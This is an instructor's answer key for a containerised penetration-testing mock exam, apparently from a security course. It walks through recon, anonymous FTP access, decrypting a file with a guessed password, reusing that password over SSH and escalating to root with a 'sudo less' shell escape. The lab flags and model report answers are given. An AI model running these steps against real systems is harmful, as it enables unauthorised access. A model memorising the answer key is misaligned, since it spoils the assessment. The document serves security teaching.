# Week 10 Mock Exam — Instructor Walkthrough & Answer Key

> Verified against live containers. Not for student distribution.

---

## Setup

```bash
cd labs/week10-mock
docker compose up -d
docker exec -it week10mock-attacker bash
```

Wait ~30-40 seconds for the FTP and SSH targets to finish provisioning
(apt installs, user creation) before starting.

---

## Phase 1: Reconnaissance

```bash
nmap -sn 10.10.50.0/24
nmap -p 21,22,80 10.10.50.0/24
```

**Verified result:** three hosts up besides the attacker itself —
`10.10.50.10` (80/tcp open), `10.10.50.11` (21/tcp open), `10.10.50.12`
(22/tcp open).

---

## Phase 2: Web Enumeration

```bash
curl http://10.10.50.10
```

**Verified result:** the rendered page lists three staff members (Priya
Nandakumar, Marcus Webb, James Reyes) and the naming convention
(first-initial + surname). The IT admin's actual username, `jreyes`, only
appears in an HTML comment at the bottom of the source — students need to
view source (`curl`, not just a browser's rendered view) to find it,
same recon lesson as Week 8's workstation target.

---

## Phase 3: FTP Enumeration & Decryption

```bash
curl ftp://anonymous:anonymous@10.10.50.11/pub/
curl ftp://anonymous:anonymous@10.10.50.11/pub/welcome.txt
curl -o backup_notice.txt.enc ftp://anonymous:anonymous@10.10.50.11/pub/backup_notice.txt.enc
```

**Verified result:** `welcome.txt` states the password policy
("PetName + current year") and names the pet ("Rusty") without spelling
out the year — students have to supply the current year themselves.
Password: **`Rusty2024`**.

```bash
openssl enc -aes-256-cbc -pbkdf2 -d -in backup_notice.txt.enc -k Rusty2024
```

**Verified result:** decrypts to a handover memo confirming the `jreyes`
SSH account "still has the temporary password set at onboarding" —
this is the pivot that tells students the FTP-derived password is also
the SSH password (password reuse, the exercise's core teaching point).

---

## Phase 4: SSH Foothold

```bash
ssh jreyes@10.10.50.12
# Password: Rusty2024
whoami
id
cat /home/jreyes/user.txt
```

**Verified result:** login succeeds. `cat /home/jreyes/user.txt` →
**`flag{mock10_ssh_foothold}`**.

---

## Phase 5: Privilege Escalation

```bash
sudo -l
```
**Verified result:**
```
User jreyes may run the following commands on technova-ssh:
    (ALL) NOPASSWD: /usr/bin/less
```

**GTFOBins escalation:**
```bash
sudo less /etc/hostname
# inside less, type:  !/bin/sh
whoami
cat /root/root.txt
```
**Verified result (non-interactive equivalent used for scripted
verification — demonstrate the interactive `!/bin/sh` shell-escape live in
class, since it generalises to reading/writing anything as root, not just
one file):**
```bash
sudo less /root/root.txt
```
→ **`flag{mock10_privesc_complete}`**.

---

## Phase 6: Analysis & Reporting — model answers

1. **Vulnerabilities, in exploited order:**
   1. Username disclosed in an HTML comment on the public web page.
   2. Anonymous FTP access with no authentication.
   3. A weak, guessable password policy (PetName + year) stated in
      plaintext on that same FTP server.
   4. The same password reused across an encrypted file *and* a live SSH
      account.
   5. A sudo NOPASSWD rule on `less`, a program with a documented
      (GTFOBins) shell-escape.
2. **Risk ratings:** HTML comment disclosure — Low; anonymous FTP — Medium;
   weak/reused password policy — High; sudo NOPASSWD less — Critical (direct
   root).
3. **Recommendations:** strip HTML comments/metadata before publishing
   pages; disable anonymous FTP or restrict it to genuinely public files;
   enforce a real password policy (length/complexity/uniqueness, not a
   guessable pattern); never reuse a password across systems; remove
   `less` (or any shell-capable program) from NOPASSWD sudo rules, or
   scope the rule to specific safe arguments only.

**Bonus — password reuse:** a single weak password compromises every
system it's reused on at once — an attacker who cracks it in one place
(here, the encrypted FTP file) gets a skeleton key to everything else,
turning one weak link into a full compromise instead of one.

**Bonus — detection:** the anonymous FTP download of `backup_notice.txt.enc`
by an unrecognised client would be the earliest observable sign — a
properly logged/monitored FTP server flags unexpected anonymous access to
a file explicitly marked as an internal handover memo.

---

## Optional CTF

Both flags verified live:
- `user.txt` (`ssh jreyes@10.10.50.12` → `cat /home/jreyes/user.txt`):
  **`flag{mock10_ssh_foothold}`**
- `root.txt` (`sudo less /root/root.txt`): **`flag{mock10_privesc_complete}`**

---

## Notes for the Instructor

Bugs found and fixed while verifying this lab live (already fixed in
`docker-compose.yaml`):

1. **vsftpd's `secure_chroot_dir` missing.** Without an init system,
   `/var/run/vsftpd/empty` never gets created, and vsftpd refuses to
   start with `500 OOPS: ... secure_chroot_dir`. Fixed by creating that
   directory explicitly in the provisioning script.
2. **vsftpd refuses a writable anonymous chroot root.** `chown -R
   ftp:ftp /srv/ftp` made the anonymous chroot root itself writable,
   which vsftpd's hardening check refuses
   (`500 OOPS: vsftpd: refusing to run with writable root inside
   chroot()`). Fixed by keeping `/srv/ftp` itself `root:root` / `755`
   (write is disabled anyway via `write_enable=NO`, so nothing needs
   `ftp` ownership).
3. **`less` wasn't installed on the SSH target** — same class of bug as
   Week 8's `week8-ubuntu-desktop` (documented in that week's
   walkthrough): stock `ubuntu:22.04` doesn't ship `less`, so the sudo
   NOPASSWD rule pointed at a binary that didn't exist, and `sudo -n
   /usr/bin/less ...` failed with `command not found` instead of
   escalating. Added `less` to the target's `apt-get install` list.

Scoring is designed to be easier than the real Week 10 exam: the FTP
memo names the pivot explicitly (real exam requires more inference), and
there's a single, clearly-signposted escalation path rather than two
independent ones.
